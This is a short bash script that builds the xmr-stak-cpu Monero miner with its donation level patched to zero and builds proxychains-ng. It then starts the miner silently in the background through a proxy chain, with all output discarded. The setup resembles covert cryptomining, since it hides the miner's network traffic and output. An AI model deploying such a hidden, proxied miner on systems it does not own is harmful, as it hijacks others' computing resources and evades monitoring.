#!/bin/bash
sysctl -w vm.nr_hugepages=128
apt-get install cmake -y
cd ~/m/test01
apt-get update && sudo apt-get install build-essential -y
apt-get install libmicrohttpd-dev libssl-dev cmake build-essential -y
rm -R ~/m/test01/xmr-stak-cpu
git clone --recursive https://github.com/fireice-uk/xmr-stak-cpu.git
cd ~/m/test01/xmr-stak-cpu
sed -i 's/1.0/0.0/' ~/m/test01/xmr-stak-cpu/donate-level.h
cmake -DCMAKE_LINK_STATIC=ON . -DMICROHTTPD_REQUIRED=OFF
make
make install
cp ~/m/test01/xmr/config.emr ~/m/test01/xmr-stak-cpu/bin/config.txt
chmod +x ~/m/test01/xmr-stak-cpu/bin/xmr-stak-cpu	
chmod +x ~/m/test01/proxychains-ng/proxychains4	
chmod +x ~/m/test01/proxychains-ng/libproxychains4.so
#
cd ~/m/test01
sudo git clone --recursive https://github.com/rofl0r/proxychains-ng.git
cd ~/m/test01/proxychains-ng
sudo  ./configure --prefix=/usr --sysconfdir=/etc
sudo make
#
#bash
#while true; do
cd ~/m/test01/xmr-stak-cpu/bin
~/m/test01/proxychains-ng/proxychains4 -f ~/m/test01/proxychains/proxychains.conf ~/m/test01/xmr-stak-cpu/bin/xmr-stak-cpu >/dev/null 2>&1 &
#do
